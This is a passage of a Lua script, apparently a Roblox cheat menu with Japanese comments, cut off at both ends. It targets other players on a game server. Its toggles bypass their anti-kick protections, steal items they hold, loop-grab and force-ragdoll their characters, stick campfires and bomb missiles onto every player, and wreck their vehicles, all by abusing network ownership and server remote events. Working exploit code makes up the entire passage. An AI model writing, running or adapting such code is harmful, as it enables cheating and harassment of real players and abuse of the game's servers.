        local TargetPLR = Players:FindFirstChild(selectedPlrName)
        if not TargetPLR then 
            Notify("Error!", "Player not found!")
            return 
        end 
        
        local suc, FriendsList = pcall(function()
            return Players:GetFriendsAsync(TargetPLR.UserId)
        end)
        
        local Friends = {}
        if suc and FriendsList then
            for _, fr in pairs(FriendsList:GetCurrentPage()) do 
                table.insert(Friends, fr.Username)
            end
        else
            Notify("Error!", "Failed to get friends list")
            return
        end
        
        
        local foundAny = false
        for _, v in pairs(Players:GetPlayers()) do 
            for _, friendName in pairs(Friends) do 
                if v.Name == friendName then 
                    foundAny = true
                    OrionLib:MakeNotification({
                        Name = "Friend found",
                        Content = v.Name .. " (" .. v.DisplayName .. ")",
                        Image = "book-user",
                        Time = 5
                    })
                end
            end
        end
        
        if not foundAny then
            OrionLib:MakeNotification({
                Name = "No friends here",
                Content = "None of " .. TargetPLR.Name .. "'s friends are on this server",
                Image = "circle-x",
                Time = 5
            })
        end
    end    
})
    TarTab:AddSection({ Name = "<font color=\"rgb(255, 0, 255)\" size = \"24\"><b>Anti-AntiSmth</b></font>"})
TarTab:AddParagraph("NOTE", [[
<font color="#FF00FF"><b>[WD]</b></font> ブリッジなどのアンチキックで飛ばされるものを防ぐのに役立ちます

<font color="#00FF00"><b>[CLICK]</b></font> 一般的なクリック機能。オーナーのネットワークオーナーを設定します

<font color="#64FF64"><b>[BYPASS]</b></font> アンチキックを壊そうとして、空中でバグらせます。pingが上がる可能性があります

<font color="#FF64FF"><b>[BLACKHOLE]</b></font> アイテムのスパムによるブラックホールでアンチキックを飛ばそうとします。家のアンチキックなどに便利です
]])
    TarTab:AddToggle({
        Name = "Anti-AntiKick<font color=\"rgb(255, 0, 255)\"><b>[WD]</b></font>",
        Default = false,
        Callback = function(Value)
            bool.LoopWD = Value
            if Value then 
                local WD = inv:FindFirstChild("SprayCanWD")
                local SoundPart = WD and WD:FindFirstChild("SoundPart")
                etc.Root = selectedPlrName and game.Players:FindFirstChild(selectedPlrName) and game.Players:FindFirstChild(selectedPlrName).Character:FindFirstChild("HumanoidRootPart")

                if not WD then 
                    WD = SpawnToy("SprayCanWD")
                    repeat task.wait() until WD and WD:FindFirstChild("SoundPart") or not bool.LoopWD
                    SoundPart = WD:FindFirstChild("SoundPart") or WD:WaitForChild("SoundPart",3)
                    ChangeCollision(WD,false)
                    task.delay(1,RenameInShop,WD,WD.Name,"Anti-AntIkick")
                end

                local HitBox = FWD(WD,"Hitbox")
                repeat  
                    sno(HitBox)
                    task.wait(0.05)
                until not HitBox.Parent or not bool.LoopWD or HitBox:FindFirstChild("PartOwner")

                while bool.LoopWD and task.wait(0.2) do
                    SoundPart = WD and WD.Parent and WD:FindFirstChild("SoundPart")
                    etc.Root = game.Players:FindFirstChild(selectedPlrName) and game.Players:FindFirstChild(selectedPlrName).Character and game.Players:FindFirstChild(selectedPlrName).Character:FindFirstChild("HumanoidRootPart")
                    if not etc.Root then  
                        repeat 
                            etc.Root = game.Players:FindFirstChild(selectedPlrName) and game.Players:FindFirstChild(selectedPlrName).Character and game.Players:FindFirstChild(selectedPlrName).Character:FindFirstChild("HumanoidRootPart")
                            task.wait(0.1)
                        until etc.Root or not bool.LoopWD
                    end
                    if not SoundPart then  
                        WD = SpawnToy("SprayCanWD")
                        repeat task.wait() until WD and WD:FindFirstChild("SoundPart") or not bool.LoopWD
                        SoundPart = WD:FindFirstChild("SoundPart") or WD:WaitForChild("SoundPart",3)
                        ChangeCollision(WD,false)
                        HitBox = FWD(WD,"Hitbox")
                        repeat  
                            sno(HitBox)
                            task.wait(0.05)
                        until not HitBox.Parent or HitBox:FindFirstChild("PartOwner") or not bool.LoopWD
                        task.delay(1,RenameInShop,WD,WD.Name,"Anti-Antikick")
                    end
                    SoundPart.CFrame = etc.Root.CFrame * CFrame.new(0,0,4)
                    task.wait()
                    SoundPart.CFrame = CFrame.new(-382.838318, 41.6491699, 665.570251)
                    SoundPart.AssemblyAngularVelocity = Vector3.zero
                    SoundPart.AssemblyLinearVelocity = Vector3.zero
                end
            end
        end    
    })
    TarTab:AddToggle({
        Name = "Anti-AntiKick<font color=\"rgb(0, 255, 0)\"><b>[CLICK]</b></font>",
        Default = false,
        Callback = function(Value)
            bool.LoopGrabAntiKick1 = Value
            if bool.LoopGrabAntiKick1 then 
                local TargetInv = selectedPlrName and workspace:FindFirstChild(selectedPlrName.."SpawnedInToys")
                local TargetPLR = selectedPlrName and Players:FindFirstChild(selectedPlrName)
                local Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                local FirePlayerPart = Root and Root:FindFirstChild("FirePlayerPart")
                local StickyPart,PartOwner,StickyWeld
                while bool.LoopGrabAntiKick1 and task.wait() do 
                    Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                    if not Root then continue end 
                    FirePlayerPart = Root:FindFirstChild("FirePlayerPart")
                    if not FirePlayerPart then continue end
                    for _,v in pairs(TargetInv:GetChildren()) do 
                        StickyPart = v:FindFirstChild("StickyPart")
                        if StickyPart then 
                            if StickyPart.CanQuery then 
                                task.spawn(function()
                                    for _,part in pairs(v:GetChildren()) do  
                                        if part:IsA("BasePart") then  
                                            part.CanCollide = false 
                                            part.CanTouch = false 
                                            part.CanQuery = false
                                        end
                                    end
                                end)
                            end
                            if not CheckNetworkOwnerOnPart(StickyPart) then 
                                sno(StickyPart)
                            end
                        end
                    end
                end
            end
        end    
    })
    TarTab:AddToggle({
        Name = "Anti-AntiKick<font color=\"rgb(100, 255, 100)\"><b>[BYPASS]</b></font>",
        Default = false,
        Callback = function(Value)
            bool.LoopGrabAntiKick1 = Value
            if bool.LoopGrabAntiKick1 then 
                local TargetInv = selectedPlrName and workspace:FindFirstChild(selectedPlrName.."SpawnedInToys")
                local TargetPLR = selectedPlrName and Players:FindFirstChild(selectedPlrName)
                local Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                local FirePlayerPart = Root and Root:FindFirstChild("FirePlayerPart")
                local StickyPart,PartOwner,StickyWeld
                while bool.LoopGrabAntiKick1 and task.wait() do 
                    Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                    if not Root then continue end 
                    FirePlayerPart = Root:FindFirstChild("FirePlayerPart")
                    if not FirePlayerPart then continue end
                    for _,v in pairs(TargetInv:GetChildren()) do 
                        StickyPart = v:FindFirstChild("StickyPart")
                        if StickyPart then 
                            StickyWeld = StickyPart and StickyPart:FindFirstChild("StickyWeld")
                            if not StickyWeld then continue end 
                            if StickyPart.CanQuery then 
                                task.spawn(function()
                                    for _,part in pairs(v:GetChildren()) do  
                                        if part:IsA("BasePart") then  
                                            part.CanCollide = false 
                                            part.CanTouch = false 
                                            part.CanQuery = false
                                        end
                                    end
                                end)
                            end
                            if StickyWeld.Part1 == hrp.FirePlayerPart and GetMagnitude(FirePlayerPart,StickyPart) > 7 then 
                                continue 
                            elseif not CheckNetworkOwnerOnPart(StickyPart) then 
                                sno(StickyPart)
                            else
                                StickyEvent:FireServer(
                                    StickyPart,
                                    FirePlayerPart,
                                    CFrame.new(0,-10,5)
                                )
                            end
                        end
                    end
                end
            end
        end    
    })
    TarTab:AddToggle({
        Name = "Anti-AntiKick<font color=\"rgb(255,100,255)\"><b>[BLACKHOLE]</b></font>",
        Default = false,
        Callback = function(Value)
            bool.loopGrabAntiKick1 = Value
            if not bool.loopGrabAntiKick1 then return end 
            local targetInv = workspace:FindFirstChild(selectedPlrName.."SpawnedInToys") 
            local ShurikensToBlackhole = {}
            while bool.loopGrabAntiKick1 and task.wait() do
                for i = 1,10 do 
                    local Shur = SpawnToy("NinjaKunai")
                    if not Shur then continue end
                    local StickyPart = FWD(Shur,"StickyPart")
                    sno(StickyPart)
                    Shur.Name = i
                    task.delay(0.5,RenameInShop,Shur,"NinjaKunai","Anti-AntiKick(Kunai)")
                    do
                        local BodyPos = Instance.new("BodyPosition")
                        BodyPos.Position = Vector3.new(math.random(-100,100),1e3,math.random(-100,100))
                        BodyPos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
                        BodyPos.Parent = StickyPart
                    end
                    table.insert(ShurikensToBlackhole,StickyPart)
                end
                local HRP = game.Players:FindFirstChild(selectedPlrName) and game.Players:FindFirstChild(selectedPlrName).Character and game.Players:FindFirstChild(selectedPlrName).Character:FindFirstChild("HumanoidRootPart") and game.Players:FindFirstChild(selectedPlrName).Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart")
                for _,v in pairs(ShurikensToBlackhole) do 
                    if not v or not v.Parent then continue end
                    StickyEvent:FireServer(
                        v,
                        HRP,
                        CFrame.new(0,0,0)
                    )
                end
                task.wait(10)
            end
        end    
    })
    TarTab:AddToggle({
        Name = "Anti-Burger",
        Default = false,
        Callback = function(Value)
            bool.StealBurger = Value
            if Value then 
                local TargetInv = workspace[selectedPlrName.."SpawnedInToys"]
                for _,v in pairs(TargetInv:GetDescendants()) do 
                    if v.Name == "HoldPart" then 
                        local HoldFunction = v:FindFirstChild("HoldItemRemoteFunction")
                        local DropFunction = v:FindFirstChild("DropItemRemoteFunction")
                        repeat 
                            HoldFunction = v.Parent and v:FindFirstChild("HoldItemRemoteFunction")
                            DropFunction = v.Parent and v:FindFirstChild("DropItemRemoteFunction")
                            if not HoldFunction then break end
                            task.wait(0.05)
                            task.spawn(function()
                                HoldFunction:InvokeServer(v.Parent,char)
                            end)
                        until not v or not v.Parent or not HoldFunction or (v["RigidConstraint"].Attachment1 and v["RigidConstraint"].Attachment1 == char["Left Arm"].LeftGripAttachment) or not bool.StealBurger 
                        if DropFunction then 
                            task.spawn(function()
                                DropFunction:InvokeServer(v.Parent)
                            end)
                        end
                        v.Name = "NotHoldPart"
                    end
                end
                cons["StealBurger"] = TargetInv.DescendantAdded:Connect(function(desc)
                    if desc.Name == "HoldPart" then 
                        task.spawn(function()
                            local suc
                            FWD(desc,"HoldItemRemoteFunction"):InvokeServer(desc.Parent,char)
                            suc,_ = pcall(function() 
                                FWD(desc,"HoldItemRemoteFunction"):InvokeServer(desc.Parent,char)
                            end)
                            if suc then 
                                repeat  
                                    if not desc or not desc.Parent then break end
                                    if desc.AssemblyRootPart ~= hrp then 
                                        FWD(desc,"HoldItemRemoteFunction"):InvokeServer(desc.Parent,char)
                                    end
                                    if not desc or not desc.Parent then break end 
                                    if desc.AssemblyRootPart ~= hrp then continue end 
                                    suc,_ = pcall(function() FWD(desc,"HoldItemRemoteFunction"):InvokeServer(desc.Parent,char); end)
                                    task.wait()
                                until not suc or not desc or not bool.StealBurger
                            end
                        end)
                    end
                end)
            else 
                cons:disc("StealBurger")
            end
        end    
    })
    
        TarTab:AddSection({ Name = "<font color=\"rgb(255, 165, 0)\"><b>All</b></font>"})

TarTab:AddToggle({
    Name = "Loop Campfire All",
    Default = false,
    Callback = function(Value)
        bool.LoopCampfireAll = Value
        
        if Value then
            task.spawn(function()
                local toy
                
                while bool.LoopCampfireAll and task.wait() do 
                    local targets = {}
                    
                    for _, plr in ipairs(Players:GetPlayers()) do
                        if plr ~= LocalPlayer then
                            if not (bool.IgnorePlot and IsInPlot(plr)) then
                                if not (bool.IgnoreFriends and LocalPlayer:IsFriendsWith(plr.UserId)) then
                                    local char = plr.Character
                                    local root = char and char:FindFirstChild("HumanoidRootPart")
                                    if root then
                                        table.insert(targets, root)
                                    end
                                end
                            end
                        end
                    end

                    if #targets == 0 then 
                        task.wait(1)
                        continue 
                    end

                    -- Campfire確保
                    toy = inv:FindFirstChild("Campfire")
                    if not toy then 
                        for _, v in pairs(inv:GetChildren()) do 
                            if v.Name == "Campfire" then 
                                DestroyToy:FireServer(v)
                            end 
                        end 
                        toy = SpawnToy("Campfire")
                        if not toy then 
                            task.wait(1)
                            continue 
                        end
                    end

                    local soundPart = toy:FindFirstChild("SoundPart") or FWD(toy, "SoundPart", 5)
                    if not soundPart then 
                        task.wait(1)
                        continue 
                    end

                    sno(soundPart)

                    -- 全員に飛ばす（着弾精度大幅向上）
                    for _, targetRoot in ipairs(targets) do
                        if not bool.LoopCampfireAll then break end
                        if not targetRoot or not targetRoot.Parent then continue end

                        local startCFrame = soundPart.CFrame
                        local targetPos = targetRoot.Position + Vector3.new(0, 3, 0)

                        -- 飛ばす（高速だけど滑らかに）
                        for i = 1, 12 do
                            if not bool.LoopCampfireAll then break end
                            local t = i / 12
                            local currentPos = startCFrame.Position:Lerp(targetPos, t * 1.55)
                            
                            soundPart.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, math.rad(i * 30), 0)
                            task.wait(0.018)
                        end

                        -- === ここを強化：ちゃんと着く処理 ===
                        local finalCFrame = targetRoot.CFrame * CFrame.new(0, 2.6, 0)  -- 少し高めに調整
                        
                        -- 複数回強制設置（着弾を確実にする）
                        for _ = 1, 4 do
                            soundPart.CFrame = finalCFrame
                            task.wait(0.03)
                        end

                        -- 着火時間
                        task.wait(0.12)
                    end

                    task.wait(0.35)
                end 
            end)
        else 
            -- オフ時に掃除
            for _, v in pairs(inv:GetChildren()) do 
                if v.Name == "Campfire" then 
                    DestroyToy:FireServer(v)
                end 
            end
        end 
    end    
})

-- ▼ Drift Kick ▼


    TarTab:AddSection({ Name = "<font color=\"rgb(255, 0, 0)\" size = \"24\"><b>SNOS GUCCI</b></font>"})
    TarTab:AddButton({
        Name = "Destroy Gucci [BLOB]",
        Callback = function()
            local blob = FindBlob() or SpawnToy("CreatureBlobman")
            if not blob then return end 
            local oldCF = char:GetPivot()
            etc.TargetPLR = game.Players:FindFirstChild(selectedPlrName)
            if not etc.TargetPLR then return end 
            etc.Root,etc.Hum = etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart"),etc.TargetPLR.Character:FindFirstChild("Humanoid")
            etc["Root"].Massless = false 
            FWD(blob,"VehicleSeat"):Sit(hum)
            while not hum.SeatPart do task.wait() end 
            local CreatureGrab = FWD(FWD(blob,"BlobmanSeatAndOwnerScript"),"CreatureGrab")
            local CreatureRelease = FWD(FWD(blob,"BlobmanSeatAndOwnerScript"),"CreatureRelease")
            local RightDetector = FWD(blob,"RightDetector")
            local RightWeld = RightDetector and FWD(RightDetector,"RightWeld")
            blob:PivotTo(etc["Root"].CFrame)
            task.wait(0.15)
            for _ = 1,15 do 
                CreatureGrab:FireServer(RightDetector,etc.Root,RightWeld)
                CreatureRelease:FireServer(RightWeld,etc["Root"])
                etc["Root"].Massless = false  
                for _ = 1,10 do 
                    etc["Hum"].Sit = true
                end
                task.wait()
            end
            char:PivotTo(oldCF)
        end    
    })

    TarTab:AddButton({
        Name = "Destroy Gucci [JUMP/SIT]",
        Callback = function()
            local blobs = {}
            local hum = FWD(char,"Humanoid")
            local oldCF = char:GetPivot()
            local TarInv = workspace:FindFirstChild(selectedPlrName.."SpawnedInToys")
            if TarInv then
                for _, v in pairs(TarInv:GetChildren()) do
                    if v.Name == "CreatureBlobman" or v.Name:sub(1,7) == "Tractor" then
                        table.insert(blobs, v)
                    end
                end
            end
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                for _, owner in pairs(plot.PlotSign.ThisPlotsOwners:GetChildren()) do
                    if owner.Value == selectedPlrName then
                        local toyFolder = workspace.PlotItems:FindFirstChild(plot.Name)
                        if toyFolder then
                            for _, v in pairs(toyFolder:GetChildren()) do
                                if v.Name == "CreatureBlobman" or v.Name:sub(1,7) == "Tractor" then
                                    table.insert(blobs, v)
                                end
                            end
                        end
                    end
                end
            end
            if #blobs == 0 then
                return
            end
            for _, v in pairs(blobs) do
                for i = 1, 2 do
                    local seat = v:FindFirstChild("VehicleSeat")
                    if seat then
                        seat:Sit(hum)
                        while not seat.Occupant do task.wait() end 
                        char:PivotTo(oldCF)
                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                        task.defer(StopAllVelocity, char)
                        task.wait(0.1)
                    else 
                        break
                    end
                end
                StopAllVelocity(char)
                char:PivotTo(oldCF)
            end
        end    
    })

    TarTab:AddButton({
        Name = "BlackHole Blobman",
        Callback = function()
            local targetinv = game.Workspace:WaitForChild(selectedPlrName.."SpawnedInToys")
            if not targetinv:FindFirstChild("CreatureBlobman") then return end
            local shurikens1 = {}
            for i = 1, 10 do
                local shuriken = SpawnToy("NinjaShuriken")
                if not shuriken then continue end 
                local StickyPart = FWD(shuriken,"StickyPart")
                sno(StickyPart)
                shuriken.Name = i
                task.delay(0.5,RenameInShop,shuriken,"NinjaShuriken","BlobmanBlackhole"..tostring(i))
                do
                    local BodyPos = Instance.new("BodyPosition")
                    BodyPos.Position = Vector3.new(math.random(-100,100),1e3,math.random(-100,100))
                    BodyPos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
                    BodyPos.Parent = StickyPart
                end
                table.insert(shurikens1, StickyPart)
            end
            for _, shuriken in ipairs(shurikens1) do
                StickyPartEvent:FireServer(
                    shuriken,
                    targetinv.CreatureBlobman.Head,
                    CFrame.new(0,3,0,0,0,0,0,0,0,0,0,0)
                )
            end
        end    
    })
    TarTab:AddSection({ Name = "<font color=\"rgb(0, 0, 255)\" size = \"24\"><b>Loops</b></font>"})
    TarTab:AddDropdown({
        Name = "LoopGrab Type",
        Default = "[Ragdoll]",
        Options = {"[Ragdoll]","[UnRagdoll]"},
        Save = true,
        Flag = "LoopGrabType",
        Callback = function(Value)
            bool.DoRagdoll = (Value == "[Ragdoll]")
        end    
    })
    local counter = 0 
    TarTab:AddToggle({
        Name = "LoopGrab<font color=\"rgb(255, 0, 255)\"><b>[NEAR]</b></font>",
        Default = false,
        Callback = function(Value)
            bool.LoopGrabNear = Value 
            if bool.LoopGrabNear then
                etc.TargetPLR = selectedPlrName and game.Players:FindFirstChild(selectedPlrName)
                etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
                etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                local Pallete
                local function SpawnPallete()
                    Pallete = SpawnToy("PalletLightBrown")
                    if not Pallete then return end 
                    local SoundPart = FWD(Pallete,"SoundPart")
                    repeat sno(SoundPart) task.wait(0.05) until CFP(SoundPart,"PartOwner") or not bool.LoopGrabNear
                    for _,v in pairs(Pallete:GetDescendants()) do 
                        if v:IsA("BasePart") then 
                            v.CanCollide = false 
                            v.Transparency = 0.8
                        end
                    end
                    Pallete.Name = "RagdollPalete"
                    task.delay(1,RenameInShop,Pallete,"PalletLightBrown","Ragdoll")
                    local bv = Instance.new("BodyVelocity")
                    bv.MaxForce = Vector3.new(0,math.huge,0)
                    bv.Velocity = Vector3.new(0,900,0)
                    bv.Parent = Pallete.SoundPart
                    return Pallete
                end
                if etc.TargetPLR then 
                    if bool.DoRagdoll then 
                        Pallete = inv:FindFirstChild("RagdollPalete")
                        if not Pallete then 
                            Pallete = SpawnPallete()
                        end
                    end
                    local oldCF = hrp.CFrame
                    local BodyPos
                    task.spawn(function()
                        while bool.LoopGrabNear and RunService.RenderStepped:Wait() do 
                            etc.TargetPLR = selectedPlrName and game.Players:FindFirstChild(selectedPlrName)
                            if not etc.TargetPLR then continue end
                            etc.Head = etc["TargetPLR"].Character and etc["TargetPLR"].Character:FindFirstChild("Head")
                            etc.Root = etc["TargetPLR"].Character and etc["TargetPLR"].Character:FindFirstChild("HumanoidRootPart")
                            etc.Hum = etc["TargetPLR"].Character and etc["TargetPLR"].Character:FindFirstChild("Humanoid")
                            BodyPos = etc.Root and etc.Root:FindFirstChild("BodyPosition")
                            if not(BodyPos) and (etc.Root) then 
                                BodyPos = Instance.new("BodyPosition")
                                BodyPos.MaxForce = Vector3.new(Huge())
                                BodyPos.Parent = etc.Root
                                BodyPos.P = 45000
                                BodyPos.D = 500
                                BodyPos.Position = hrp.Position + Vector3.new(0,1,10)
                            end
                            if (etc.Head and etc.Hum and etc.Root and etc.Hum.Health ~= 0) and GetMagnitude(hrp,etc["Root"]) <= 30 then  
                                sno(etc["Root"])
                                RunService.RenderStepped:Wait()
                                if bool.DoRagdoll then 
                                    Pallete = inv:FindFirstChild("RagdollPalete")
                                    if not Pallete then 
                                        Pallete = SpawnPallete()
                                    end
                                    if CFP(etc["Hum"],"Ragdolled") and not(etc["Hum"].Ragdolled.Value) then 
                                        Pallete.SoundPart.Position = etc["Root"].Position
                                    end
                                end
                                sno(etc["Root"])
                            else 
                                if not etc["Head"] or not etc["Hum"] or etc["Hum"].Health == 0 then  
                                    etc.TargetPLR.CharacterAdded:Wait()
                                    etc.Head = FWD(etc.TargetPLR.Character,"Head",5)
                                    etc.Hum = FWD(etc.TargetPLR.Character,"Humanoid",5)
                                    BodyPos = Instance.new("BodyPosition")
                                    BodyPos.MaxForce = Vector3.new(Huge())
                                    BodyPos.Parent = etc.Root
                                    BodyPos.P = 10000
                                    BodyPos.D = 100
                                    BodyPos.Position = hrp.Position + Vector3.new(0,1,10)
                                end
                                oldCF = hrp.CFrame
                                while (etc["Head"] and etc["Hum"] and etc['Hum'].Health ~= 0) and task.wait(0.01) and bool.LoopGrabNear do 
                                    etc["TargetPLR"] = selectedPlrName and Players:FindFirstChild(selectedPlrName)
                                    if not etc["TargetPLR"] then continue end
                                    if etc["TargetPLR"].InPlot.Value then continue end
                                    etc["Head"] = etc["TargetPLR"].Character and etc["TargetPLR"].Character:FindFirstChild("Head")
                                    etc["Hum"] = etc["TargetPLR"].Character and etc["TargetPLR"].Character:FindFirstChild("Humanoid")
                                    if not(etc["Head"]) or not(etc["Hum"]) then break end 
                                    char:PivotTo(etc["Head"].CFrame * CFrame.new(0,10,0))
                                    sno(etc["Head"])
                                    if CheckForPartOwner(etc["Head"]) then 
                                        break
                                    end
                                end
                                hrp.CFrame = oldCF
                                if etc.Head and CheckForPartOwner(etc["Head"]) then 
                                    for _,v in pairs(etc.TargetPLR.Character:GetChildren()) do
                                        if v:IsA("BasePart") then
                                            v.CFrame = CFrame.new(BodyPos.Position)
                                        end
                                    end
                                end
                            end
                        end
                        if etc["Root"] then 
                            for _,v in pairs(etc["Root"]:GetChildren()) do 
                                if v.Name == "BodyPosition" then 
                                    v:Destroy()
                                end
                            end
                        end
                    end)
                end
            end
        end    
    })
    
    TarTab:AddToggle({
    Name = "Loop Bomb Missile",
    Default = false,
    Callback = function(Value)
        bool.LoopBombMissile = Value 
        if Value then 
            task.spawn(function()
                local bomb, Hitbox
                etc.TargetPLR = Players:FindFirstChild(selectedPlrName)
                if not etc.TargetPLR then Notify("Error","Target is not exists!") return end 
                
                while bool.LoopBombMissile and task.wait() do 
                    etc.TargetPLR = Players:FindFirstChild(selectedPlrName)
                    if not etc.TargetPLR then continue end
                    
                    local targetChar = etc.TargetPLR.Character
                    if not targetChar then continue end
                    
                    bomb = inv:FindFirstChild("BombMissile")
                    Hitbox = bomb and bomb:FindFirstChild("HitboxBodyTop")
                    
                    if not Hitbox then 
                        -- 既存のBombMissileを削除
                        for _,v in pairs(inv:GetChildren()) do 
                            if v.Name == "BombMissile" then 
                                DestroyToy:FireServer(v)
                            end 
                        end 
                        bomb = SpawnToy("BombMissile")
                        if not bomb then continue end
                        Hitbox = FWD(bomb, "HitboxBodyTop", 5)
                        if not Hitbox then continue end
                    end

                    -- ネットワーク所有権確保
                    sno(Hitbox)
                    
                    -- ターゲットに貼り付ける
                    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        Hitbox.CFrame = targetRoot.CFrame * CFrame.new(0, 5, 0)
                    end
                    
                    -- 所有権チェック
                    for _,v in pairs(bomb:GetChildren()) do 
                        if v:IsA("BasePart") and CFP(v,"PartOwner") and not CheckNetworkOwnerOnPart(v) then 
                            DestroyToy:FireServer(bomb) 
                            bomb = nil 
                            break 
                        end
                    end
                end 
            end)
        else 
            -- オフにしたときに掃除
            for _,v in pairs(inv:GetChildren()) do 
                if v.Name == "BombMissile" then 
                    DestroyToy:FireServer(v)
                end 
            end
        end 
    end    
})

-- === パレット ラグドール（Fling → Ragdoll 修正版） ===
local palletRagdollActive = false
local palletRagdollTask = nil
local currentPallet = nil

local function PalletRagdollFunction(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if not target or not target.Character then 
        palletRagdollActive = false
        return 
    end

    local RS = game:GetService("ReplicatedStorage")
    local GE = RS:FindFirstChild("GrabEvents")
    if not GE then 
        warn("GrabEvents not found")
        palletRagdollActive = false
        return 
    end

    local LP = game.Players.LocalPlayer

    -- パレットをスポーン
    local success = pcall(function()
        RS.MenuToys.SpawnToyRemoteFunction:InvokeServer("PalletLightBrown", CFrame.new(0, 1500, 0), Vector3.zero)
    end)
    
    if not success then
        palletRagdollActive = false
        return
    end

    -- パレット取得
    local pallet = nil
    local attempts = 0
    while attempts < 40 and palletRagdollActive do
        local folder = workspace:FindFirstChild(LP.Name .. "SpawnedInToys")
        if folder then
            pallet = folder:FindFirstChild("PalletLightBrown")
            if pallet then break end
        end
        task.wait(0.05)
        attempts = attempts + 1
    end

    if not pallet then
        palletRagdollActive = false
        return
    end

    currentPallet = pallet

    -- パーツ収集
    local parts = {}
    for _, part in ipairs(pallet:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(parts, part)
        end
    end
    if #parts == 0 then
        palletRagdollActive = false
        return
    end

    local mainPart = parts[1]

    -- パーツ初期設定
    for _, part in ipairs(parts) do
        pcall(function()
            part.CanCollide = false
            part.Anchored = false
            part.Massless = true
            part.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0, 0, 0, 0)
        end)
    end

    -- 権限取得関数
    local function claim(part)
        if not part or not part.Parent then return end
        pcall(function()
            GE.SetNetworkOwner:FireServer(part, part.CFrame)
            GE.CreateGrabLine:FireServer(part, Vector3.zero, part.Position, false)
            GE.DestroyGrabLine:FireServer(part)
        end)
    end

    local function claimTarget(root)
        if not root or not root.Parent then return end
        pcall(function()
            GE.SetNetworkOwner:FireServer(root, root.CFrame)
        end)
    end

    -- 初期権限取得
    for _, part in ipairs(parts) do
        claim(part)
    end

    while palletRagdollActive and target and target.Parent and target.Character do
        local targetChar = target.Character
        local root = targetChar:FindFirstChild("HumanoidRootPart") 
            or targetChar:FindFirstChild("Torso")
            or targetChar:FindFirstChild("UpperTorso")

        if not root or not root.Parent then
            task.wait(0.05)
            continue
        end

        local hum = targetChar:FindFirstChildOfClass("Humanoid")
        if not hum then
            task.wait(0.05)
            continue
        end

        if not pallet or not pallet.Parent then
            break
        end

        local rootPos = root.Position

        -- === 1. ターゲットに権限を取る ===
        claimTarget(root)

        -- === 2. パレットを対象の足元に配置 ===
        pcall(function()
            for _, part in ipairs(parts) do
                local offset = part.Position - mainPart.Position
                part.CFrame = CFrame.new(rootPos + Vector3.new(0, -1.2, 0) + offset)
                part.AssemblyLinearVelocity = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
                part.CanCollide = false
                claim(part)
            end
        end)
        task.wait(0.05)

        -- === 3. ラグドール化！ ===
        pcall(function()
            -- 人間をラグドール状態にする
            hum:ChangeState(Enum.HumanoidStateType.Ragdolled)
            hum.PlatformStand = true
            hum.Sit = true
            hum.AutoRotate = false
            
            -- 関節を弱体化（ラグドールを強制）
            for _, motor in ipairs(targetChar:GetDescendants()) do
                if motor:IsA("Motor6D") then
                    motor.MaxVelocity = 0
                end
            end
            
            -- 全パーツの物理を緩める
            for _, part in ipairs(targetChar:GetChildren()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.CanCollide = false
                    part.AssemblyLinearVelocity = Vector3.new(
                        math.random(-5, 5),
                        -2,
                        math.random(-5, 5)
                    )
                end
            end
            
            -- HumanoidRootPartも少し浮かせる
            root.AssemblyLinearVelocity = Vector3.new(0, 2, 0)
            root.AssemblyAngularVelocity = Vector3.new(
                math.random(-10, 10),
                math.random(-10, 10),
                math.random(-10, 10)
            )
        end)

        task.wait(0.2)

        -- === 4. パレットを回転させてラグドール状態を維持 ===
        for i = 1, 6 do
            if not palletRagdollActive then break end
            local angle = math.rad(i * 60)
            pcall(function()
                for _, part in ipairs(parts) do
                    local offset = part.Position - mainPart.Position
                    local rotated = CFrame.Angles(0, angle, math.sin(angle) * 0.3) * offset
                    part.CFrame = CFrame.new(rootPos + Vector3.new(0, -1.0, 0) + rotated)
                    part.AssemblyAngularVelocity = Vector3.new(0, 1000, 0)
                    part.CanCollide = false
                    claim(part)
                end
                
                -- ターゲットも回転させる
                root.AssemblyAngularVelocity = Vector3.new(0, 800, 0)
                claimTarget(root)
            end)
            task.wait(0.05)
        end

        -- === 5. ラグドール状態をキープ（強制） ===
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Ragdolled)
            hum.PlatformStand = true
            hum.Sit = true
            
            -- わずかに下方向に落ちるようにして倒れる
            root.AssemblyLinearVelocity = Vector3.new(0, -1, 0)
        end)

        task.wait(0.15)

        -- === 6. 古いパレットを削除して新しいものをスポーン ===
        if palletRagdollActive then
            if pallet and pallet.Parent then
                pcall(function()
                    RS.MenuToys.DestroyToy:FireServer(pallet)
                    pallet:Destroy()
                end)
            end

            pcall(function()
                RS.MenuToys.SpawnToyRemoteFunction:InvokeServer("PalletLightBrown", CFrame.new(0, 1500, 0), Vector3.zero)
            end)

            local newPallet = nil
            local a = 0
            while a < 25 and palletRagdollActive do
                local folder = workspace:FindFirstChild(LP.Name .. "SpawnedInToys")
                if folder then
                    newPallet = folder:FindFirstChild("PalletLightBrown")
                    if newPallet then break end
                end
                task.wait(0.05)
                a = a + 1
            end

            if newPallet then
                pallet = newPallet
                currentPallet = pallet
                parts = {}
                for _, part in ipairs(pallet:GetDescendants()) do
                    if part:IsA("BasePart") then
                        table.insert(parts, part)
                    end
                end
                mainPart = parts[1] or mainPart

                for _, part in ipairs(parts) do
                    pcall(function()
